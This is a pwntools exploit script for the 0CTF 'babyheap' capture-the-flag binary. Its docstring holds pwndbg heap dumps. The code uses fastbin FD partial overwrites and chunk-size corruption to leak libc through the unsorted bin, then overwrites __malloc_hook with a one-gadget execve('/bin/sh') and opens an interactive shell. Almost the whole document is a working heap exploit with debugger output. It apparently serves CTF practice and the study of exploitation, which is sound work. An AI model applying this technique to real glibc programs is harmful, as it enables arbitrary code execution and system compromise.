from pwn import *

"""

 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ <-- Chunk start
 |          PREV_SIZE OR USER DATA       |
 +---------------------------------+-+-+-+
 | CHUNK SIZE                      |A|M|P|
 +---------------------------------+-+-+-+ 
 |           FORWARD POINTER(FD)         | <-- All freechunks
 |            BACK POINTER(BK)           | <-- normalchunk or larger
 |   NEXT BIGGER POINTER (fd_nextsize)   | <-- Only if largechunk
 |   PREVIOUS SMALLER PTR(bk_nextsize)   | <-- Only if largechunk
 | -  -  -  -  -  -  -  -  -  -  -  -  - | <-- End of this chunk.
 |               PREV_SIZE               |
 +---------------------------------------+

Inspect the heap with pwndbg "heap" command

pwndbg> heap 
Top Chunk: 0x559dd7a07150
Last Remainder: 0

0x559dd7a07000 FASTBIN {
prev_size = 0, 
size = 49, 
fd = 0x0, 
bk = 0x0, 
fd_nextsize = 0x0, 
bk_nextsize = 0x0

pwndbg> x/40gx 0x5616e8d6b000
0x5616e8d6b000: 0x0000000000000000      0x0000000000000031 <- chunk0 (fastbin) (in use)
0x5616e8d6b010: 0x0000000000000000      0x0000000000000000
0x5616e8d6b020: 0x0000000000000000      0x0000000000000000
0x5616e8d6b030: 0x0000000000000000      0x0000000000000031 <- chunk1 (fastbin) (free)
0x5616e8d6b040: 0x0000000000000000      0x0000000000000000
0x5616e8d6b050: 0x0000000000000000      0x0000000000000000
0x5616e8d6b060: 0x0000000000000000      0x0000000000000031 <- chunk2 (fastbin) (in use)
0x5616e8d6b070: 0x0000000000000000      0x0000000000000000 <- FD not populated
0x5616e8d6b080: 0x0000000000000000      0x0000000000000000
0x5616e8d6b090: 0x0000000000000000      0x0000000000000031 <- chunk3 (fastbin) (in use)
0x5616e8d6b0a0: 0x0000000000000000      0x0000000000000000
0x5616e8d6b0b0: 0x0000000000000000      0x0000000000000000
0x5616e8d6b0c0: 0x0000000000000000      0x0000000000000091 <- chunk4 (smallbin) (in use)
0x5616e8d6b0d0: 0x0000000000000000      0x0000000000000000
0x5616e8d6b0e0: 0x0000000000000000      0x0000000000000000
0x5616e8d6b0f0: 0x0000000000000000      0x0000000000000000
0x5616e8d6b100: 0x0000000000000000      0x0000000000000000
0x5616e8d6b110: 0x0000000000000000      0x0000000000000000
0x5616e8d6b120: 0x0000000000000000      0x0000000000000000
0x5616e8d6b130: 0x0000000000000000      0x0000000000000000

pwndbg> x/40gx &main_arena 
0x7f8c2eef3b20 <main_arena>:    0x0000000000000000      0x0000000000000000
0x7f8c2eef3b30 <main_arena+16>: 0x000055c3c35ec030      0x0000000000000000 <- populated fastbin (chunk 1)
0x7f8c2eef3b40 <main_arena+32>: 0x0000000000000000      0x0000000000000000
0x7f8c2eef3b50 <main_arena+48>: 0x0000000000000000      0x0000000000000000
0x7f8c2eef3b60 <main_arena+64>: 0x0000000000000000      0x0000000000000000
0x7f8c2eef3b70 <main_arena+80>: 0x0000000000000000      0x000055c3c35ec150 <- top chunk
0x7f8c2eef3b80 <main_arena+96>: 0x0000000000000000      0x00007f8c2eef3b78
0x7f8c2eef3b90 <main_arena+112>:        0x00007f8c2eef3b78      0x00007f8c2eef3b88
0x7f8c2eef3ba0 <main_arena+128>:        0x00007f8c2eef3b88      0x00007f8c2eef3b98
0x7f8c2eef3bb0 <main_arena+144>:        0x00007f8c2eef3b98      0x00007f8c2eef3ba8
0x7f8c2eef3bc0 <main_arena+160>:        0x00007f8c2eef3ba8      0x00007f8c2eef3bb8
0x7f8c2eef3bd0 <main_arena+176>:        0x00007f8c2eef3bb8      0x00007f8c2eef3bc8
0x7f8c2eef3be0 <main_arena+192>:        0x00007f8c2eef3bc8      0x00007f8c2eef3bd8
0x7f8c2eef3bf0 <main_arena+208>:        0x00007f8c2eef3bd8      0x00007f8c2eef3be8
0x7f8c2eef3c00 <main_arena+224>:        0x00007f8c2eef3be8      0x00007f8c2eef3bf8
0x7f8c2eef3c10 <main_arena+240>:        0x00007f8c2eef3bf8      0x00007f8c2eef3c08
0x7f8c2eef3c20 <main_arena+256>:        0x00007f8c2eef3c08      0x00007f8c2eef3c18
0x7f8c2eef3c30 <main_arena+272>:        0x00007f8c2eef3c18      0x00007f8c2eef3c28
0x7f8c2eef3c40 <main_arena+288>:        0x00007f8c2eef3c28      0x00007f8c2eef3c38
0x7f8c2eef3c50 <main_arena+304>:        0x00007f8c2eef3c38      0x00007f8c2eef3c48


After freeing the second entry:

pwndbg> x/40gx 0x55c3b31a9000
0x55c3b31a9000: 0x0000000000000000      0x0000000000000031 <- chunk0 (fastbin) (in use)
0x55c3b31a9010: 0x0000000000000000      0x0000000000000000
0x55c3b31a9020: 0x0000000000000000      0x0000000000000000
0x55c3b31a9030: 0x0000000000000000      0x0000000000000031 <- chunk1 (fastbin) (already freed)
0x55c3b31a9040: 0x0000000000000000      0x0000000000000000
0x55c3b31a9050: 0x0000000000000000      0x0000000000000000
0x55c3b31a9060: 0x0000000000000000      0x0000000000000031 <- chunk2 (fastbin) (free)
0x55c3b31a9070: 0x000055c3b31a9030      0x0000000000000000 <- FD populated
0x55c3b31a9080: 0x0000000000000000      0x0000000000000000
0x55c3b31a9090: 0x0000000000000000      0x0000000000000031 <- chunk3 (fastbin (in use)
0x55c3b31a90a0: 0x0000000000000000      0x0000000000000000
0x55c3b31a90b0: 0x0000000000000000      0x0000000000000000
0x55c3b31a90c0: 0x0000000000000000      0x0000000000000091 <- chunk4 (smallbin (in use)
0x55c3b31a90d0: 0x0000000000000000      0x0000000000000000
0x55c3b31a90e0: 0x0000000000000000      0x0000000000000000
0x55c3b31a90f0: 0x0000000000000000      0x0000000000000000
0x55c3b31a9100: 0x0000000000000000      0x0000000000000000
0x55c3b31a9110: 0x0000000000000000      0x0000000000000000
0x55c3b31a9120: 0x0000000000000000      0x0000000000000000
0x55c3b31a9130: 0x0000000000000000      0x0000000000000000


pwndbg> x/40gx &main_arena 
0x7f24b5111b20 <main_arena>:    0x0000000000000000      0x0000000000000000
0x7f24b5111b30 <main_arena+16>: 0x000055c3b31a9060      0x0000000000000000 <- last freed chunk (chunk2) is placed on top of freelist
0x7f24b5111b40 <main_arena+32>: 0x0000000000000000      0x0000000000000000
0x7f24b5111b50 <main_arena+48>: 0x0000000000000000      0x0000000000000000
0x7f24b5111b60 <main_arena+64>: 0x0000000000000000      0x0000000000000000
0x7f24b5111b70 <main_arena+80>: 0x0000000000000000      0x000055c3b31a9150
0x7f24b5111b80 <main_arena+96>: 0x0000000000000000      0x00007f24b5111b78
0x7f24b5111b90 <main_arena+112>:        0x00007f24b5111b78      0x00007f24b5111b88
0x7f24b5111ba0 <main_arena+128>:        0x00007f24b5111b88      0x00007f24b5111b98
0x7f24b5111bb0 <main_arena+144>:        0x00007f24b5111b98      0x00007f24b5111ba8
0x7f24b5111bc0 <main_arena+160>:        0x00007f24b5111ba8      0x00007f24b5111bb8
0x7f24b5111bd0 <main_arena+176>:        0x00007f24b5111bb8      0x00007f24b5111bc8
0x7f24b5111be0 <main_arena+192>:        0x00007f24b5111bc8      0x00007f24b5111bd8
0x7f24b5111bf0 <main_arena+208>:        0x00007f24b5111bd8      0x00007f24b5111be8
0x7f24b5111c00 <main_arena+224>:        0x00007f24b5111be8      0x00007f24b5111bf8
0x7f24b5111c10 <main_arena+240>:        0x00007f24b5111bf8      0x00007f24b5111c08
0x7f24b5111c20 <main_arena+256>:        0x00007f24b5111c08      0x00007f24b5111c18
0x7f24b5111c30 <main_arena+272>:        0x00007f24b5111c18      0x00007f24b5111c28
0x7f24b5111c40 <main_arena+288>:        0x00007f24b5111c28      0x00007f24b5111c38
0x7f24b5111c50 <main_arena+304>:        0x00007f24b5111c38      0x00007f24b5111c48

After partial overwrite

pwndbg> x/40gx 0x55f5895f4000
0x55f5895f4000: 0x0000000000000000      0x0000000000000031
0x55f5895f4010: 0x0000000000000000      0x0000000000000000
0x55f5895f4020: 0x0000000000000000      0x0000000000000000
0x55f5895f4030: 0x0000000000000000      0x0000000000000031
0x55f5895f4040: 0x0000000000000000      0x0000000000000000
0x55f5895f4050: 0x0000000000000000      0x0000000000000000
0x55f5895f4060: 0x0000000000000000      0x0000000000000031
0x55f5895f4070: 0x000055f5895f40c0      0x0000000000000000 <- corrupted FD (now points to smallbin) (smallbin and fast bin are located here and are overlapping)
0x55f5895f4080: 0x0000000000000000      0x0000000000000000
0x55f5895f4090: 0x0000000000000000      0x0000000000000031
0x55f5895f40a0: 0x0000000000000000      0x0000000000000000
0x55f5895f40b0: 0x0000000000000000      0x0000000000000000
0x55f5895f40c0: 0x0000000000000000      0x0000000000000031 <- corrupted size (now fastbin size)
0x55f5895f40d0: 0x0000000000000000      0x0000000000000000
0x55f5895f40e0: 0x0000000000000000      0x0000000000000000
0x55f5895f40f0: 0x0000000000000000      0x0000000000000000
0x55f5895f4100: 0x0000000000000000      0x0000000000000000
0x55f5895f4110: 0x0000000000000000      0x0000000000000000
0x55f5895f4120: 0x0000000000000000      0x0000000000000000
0x55f5895f4130: 0x0000000000000000      0x0000000000000000

"""

context.terminal = (["terminator", "-e"])
#p = process(['./0ctfbabyheap.dms'], env={"LD_PRELOAD":"./libc.so.6"})
p = gdb.debug('./0ctfbabyheap.dms', 'b main')
context(os='linux', arch='amd64')
#context.log_level = 'DEBUG'


def allocate(size):
	log.info("Allocating Size: " + str(size))
	p.sendline('1')
	p.sendlineafter(': ', str(size))
	p.recvuntil(': ', timeout=1)

def free(idx):
	log.info("Freeing: " + str(idx))
	p.sendline('3')
	p.sendlineafter(': ', str(idx))
	p.recvuntil(': ')

def dump(idx):
	log.info("Dumping: " + str(idx))
	p.sendline('4')
	p.sendlineafter(': ', str(idx))
	p.recvuntil(': \n')
	data = p.recvline()
	p.recvuntil(': ')
	return data

def fill(idx, data):
	log.info("Filling: " + str(idx))
	p.sendline('2')
	p.sendlineafter(': ', str(idx))
	p.sendlineafter(': ', str(len(data)))
	p.sendafter(': ', data)
	p.recvuntil(': ')

def interact():
	log.success("Popping Shell")
	p.interactive()

def exploit():

	log.success("Sending Exploit...")

	p.recvuntil(": ")

	allocate(0x20) # fast bin
	allocate(0x20) # fast bin
	allocate(0x20) # fast bin
	allocate(0x20) # fast bin
	allocate(0x80) # smallbin

	free(1) # free fast bin
	free(2) # free fast bin # this is now the top of the fastbin free list

	payload  = p64(0)*5
	payload += p64(0x31)
	payload += p64(0)*5
	payload += p64(0x31)
	payload += p8(0xc0)
	fill(0, payload) # partial overwrite of fastbin->FD with \xc0 (location of smallbin) (overlapping chunks)

	payload  = p64(0)*5
	payload += p64(0x31) # corrupting smallbin->size to pass allocation assert # chunk 4
	fill(3, payload)

	allocate(0x20) # top free list (last freed)
	allocate(0x20) # (corrupted pointer of FD)

	payload  = p64(0)*5
	payload += p64(0x91) # restoring chunk size back to 0x91 # chunk 4
	fill(3, payload)

	"""
	The heap is composed of 4 fast bins which have a size of 0x20 with their header and 2 small bins which have a size of 0x90 with the header. 
	The fifth first bins are used to leak the LibC and the last small bin is used to force free() to put the fifth chunk into the unsorted bin and so populated the forward pointer when we will free it. 
	If this chunk is not present, free() will consolidate the freed chunk into the top chunk, as you can see below:
	"""

	allocate(0x68) 

	free(4) # avoid heap consolditation force free() to put the fifth chunk into the unsorted bin and so populated the forward pointer when we will free it. If this chunk is not present, free() will consolidate the freed chunk into the top chunk

	free(3) # populate fd and bk of chunk 4

	offset = 0x3c4b78

	libcBase = u64(dump(2)[:8]) - offset # pointer to overlapped chunk
	leak = u64(dump(2)[:8])
	log.success("main_arena+88: " + hex(leak))
	log.success("libc: " + hex(libcBase))

	allocate(0x68) 

	free(4) # places target chunck on top of free list so we can preform overwrite

	execve = 0x4526a # one shot execv(/bin/sh) gadget

	fill(2, p64(libcBase + 0x3C4AED)) # target chunk

	log.success("Target Chunk: " + hex(libcBase + 0x3C4AED))

	allocate(0x60)

	allocate(0x60) # return our target pointer

	payload  = '\x00'*3
	payload += p64(0)*2
	#payload += p64(0x4141414141414141)
	payload += p64(libcBase + execve) # overwrite pointer
	fill(6, payload)

	allocate(1337) # triggers malloc and call system

	interact() # interactive shell

exploit()